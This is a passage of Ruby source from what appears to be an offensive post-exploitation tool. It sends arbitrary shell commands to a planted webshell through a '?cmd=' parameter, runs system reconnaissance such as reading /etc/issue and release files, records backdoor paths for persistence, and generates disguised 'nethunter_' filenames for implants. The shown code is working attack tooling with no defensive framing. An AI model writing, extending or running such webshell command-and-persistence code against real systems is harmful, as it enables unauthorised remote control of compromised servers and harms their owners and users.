  result = execute_persistence_command(webshell_url, cmd)
  system_info[:users] = result if result
  
  # Get system version
  cmd = "cat /etc/issue || cat /etc/*-release"
  result = execute_persistence_command(webshell_url, cmd)
  system_info[:system_version] = result if result
  
  persistence_info[:backdoor_paths] = persistence_paths
  persistence_info[:system_info] = system_info
  
  persistence_info
end

def execute_persistence_command(webshell_url, cmd)
  begin
    encoded_cmd = URI.encode_www_form_component(cmd)
    uri = URI.parse("#{webshell_url}?cmd=#{encoded_cmd}")
    http = create_http_client(uri)
    
    response = http.get(uri.request_uri)
    
    if response.code.to_i == 200
      return response.body.strip
    end
  rescue => e
    log("  [-] Error executing persistence command: #{e.message}", 2)
  end
  
  nil
end

def random_filename
  "nethunter_#{SecureRandom.hex(4)}"
end
end
